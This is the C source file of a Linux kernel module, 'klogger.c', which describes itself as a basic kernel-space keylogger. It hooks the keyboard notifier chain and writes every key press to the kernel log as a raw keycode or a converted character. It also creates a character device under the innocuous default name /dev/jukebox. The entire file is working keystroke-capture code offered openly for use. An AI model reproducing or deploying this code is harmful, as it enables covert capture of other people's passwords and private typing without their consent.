/* klogger.c -  Basic Implementation of a keylogger at kernel space */
#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/kdev_t.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <linux/cdev.h>
#include <linux/keyboard.h>
#include <asm/uaccess.h>
#include "klogger.h"

static dev_t first; // Global variable for the first device number 
static struct cdev c_dev; // Global variable for the character device structure
static struct class *cl; // Global variable for the device class
static char c;

/* Module's input parameters */
static char *cdev_name = "jukebox";
static char *scan_code = "RAW";
module_param(cdev_name, charp, 0000);
MODULE_PARM_DESC(cdev_name, " Define a different name for your /dev file. By default, it is /dev/jukebox.");
module_param(scan_code, charp, 0000);
MODULE_PARM_DESC(scan_code, " Select the most suitable scan code to your keyboard layout. Only RAW and SET1 (IBM PC XT) are available");  

/** 
 * Handler responsable to read and log every key pressed by the user
 *
 */
int keyboard_listener(struct notifier_block *nblock, unsigned long code, void *_param) {
  struct keyboard_notifier_param *param = _param;
  struct vc_data *vc = param->vc;

  if (code == KBD_KEYCODE && param->down) { // log only when user press the button, ignoring the release button action

#ifdef DEBUG
    printk(KERN_DEBUG "KEYLOGGER code=%lu value=%i down=%s shift=%i ledstate=%i\n",
		code,
		param->value, 
		(param->down ? "down" : "up"),
		param->shift,
		param->ledstate);
#endif
	
	if(strcmp(scan_code,"SET1")==0) {
		printk("%c",convertKeycode2Character(param->value,param->shift));
	} 
	else {
                printk("%i",param->value);
	}
  }

  return NOTIFY_OK;
}

/**
 * This function is called when the module is loaded
 *
 */
int init_dev_file()
{
  if (alloc_chrdev_region(&first, 0, 1, cdev_name) < 0)
  {
    return -1;
  }
    if ((cl = class_create(THIS_MODULE, "chardrv")) == NULL)
  {
    unregister_chrdev_region(first, 1);
    return -1;
  }
    if (device_create(cl, NULL, first, NULL, cdev_name) == NULL)
  {
    class_destroy(cl);
    unregister_chrdev_region(first, 1);
    return -1;
  }
    cdev_init(&c_dev, &dev_fops);
    if (cdev_add(&c_dev, first, 1) == -1)
  {
    device_destroy(cl, first);
    class_destroy(cl);
    unregister_chrdev_region(first, 1);
    return -1;
  }
  return 0;
}

/**
 * This function is called when the module is unloaded
 *
 */
void clear_dev_file()
{
 cdev_del(&c_dev);
 device_destroy(cl, first);
 class_destroy(cl);
 unregister_chrdev_region(first, 1);
 printk(KERN_INFO "/dev/%s removed\n", cdev_name);
}


/**
 * This function is called then the /dev/<name> file is read
 *
 */
ssize_t read_dev_file(struct file *f, char __user *buf, size_t len, loff_t *off)
{
    printk(KERN_INFO "Driver: read()\n");
    if (copy_to_user(buf, &c, 1) != 0)
        return -EFAULT;
    else
        return 1;
}

/**
 * This function is called with the /dev/<name> file is written
 *
 */
ssize_t write_dev_file(struct file *f, const char __user *buf, size_t len, loff_t *off)
{
    printk(KERN_INFO "Driver: write()\n");
    if (copy_from_user(&c, buf + len - 1, 1) != 0)
        return -EFAULT;
    else
        return len;
}


static int __init klogger_init(void)
{
  init_dev_file();
  register_keyboard_notifier(&nb);
  printk(KERN_INFO "klogger registered and listening\n");

  return 0;
}

static void __exit klogger_exit(void)
{
  clear_dev_file();
  unregister_keyboard_notifier(&nb);
  printk(KERN_INFO "klogger unregistered\n");
}


module_init(klogger_init);
module_exit(klogger_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Carlos Andre");
MODULE_DESCRIPTION("A basic keylogger implemention.");
